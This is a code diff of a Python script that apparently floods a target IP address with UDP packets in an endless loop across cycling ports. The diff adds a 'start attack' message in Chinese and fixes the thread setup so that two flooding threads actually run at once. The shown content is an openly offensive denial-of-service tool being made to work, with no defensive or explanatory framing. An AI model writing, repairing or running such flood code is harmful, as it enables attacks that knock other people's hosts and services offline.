@@ -28,6 +28,7 @@ time.sleep(3)
 
 
 def run_send(ip, port):
+    print("开始攻击")
     sent = 0
     while True:
         sock.sendto(bytes, (ip, port))
@@ -38,8 +39,8 @@ def run_send(ip, port):
             port = 1
 
 
-t1 = threading.Thread(target=run_send(ip, port), name='send')
-t2 = threading.Thread(target=run_send(ip, port), name='send2')
+t1 = threading.Thread(target=run_send, args=(ip, port))
+t2 = threading.Thread(target=run_send, args=(ip, port))
 t1.start()
 t2.start()
 t1.join()
